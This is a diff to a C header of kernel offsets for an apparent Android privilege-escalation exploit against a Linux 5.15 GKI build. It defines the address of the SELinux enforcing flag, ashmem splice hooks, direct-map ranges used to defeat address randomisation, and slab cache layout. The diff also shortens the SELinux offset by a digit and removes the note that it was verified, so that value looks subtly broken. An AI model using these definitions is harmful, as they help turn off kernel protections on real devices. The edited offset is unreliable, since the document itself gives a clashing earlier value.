@@ -20,7 +20,7 @@
  *   - copy_splice_read() does not exist in 5.15; ashmem_fops.splice_read is NULL,
  *     so COPY_SPLICE_READ is set to generic_file_splice_read (verified symbol).
  *   - selinux_enforcing is not a symbol; enforcing is selinux_state.enforcing (u8)
- *     at offset 0, so SELINUX_ENFORCING_OFF = selinux_state offset (0x02da9d78).
+ *     at offset 0, so SELINUX_ENFORCING_OFF = selinux_state offset (0x02a9d78).
  *   - SLIDE_RANDOM_BOOT_ID_DATA (boot_id uuid buffer) is not a symbol; it is
  *     resolved at runtime by slide.c (reads sysctl_bootid + 8), and the
  *     kernel base is known from symbols (SLIDE_KERNEL_BASE_KNOWN), so the
@@ -37,6 +37,7 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
+#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)  /* POCO: 0 */
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
@@ -320,8 +321,8 @@
 /* ===== selinux_state.enforcing =====
  * 5.15 has no selinux_enforcing symbol; enforcing is selinux_state.enforcing
  * (u8) at offset 0 within struct selinux_state. selinux_state symbol offset
- * (addr - _text) = 0x02da9d78 (verified against device kallsyms). */
-#define SELINUX_ENFORCING_OFF 0x02da9d78ULL
+ * (addr - _text) = 0x02a9d78. */
+#define SELINUX_ENFORCING_OFF 0x02a9d78ULL
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
 
 /* ===== kmalloc_caches[] layout for this 5.15.180 GKI build =====
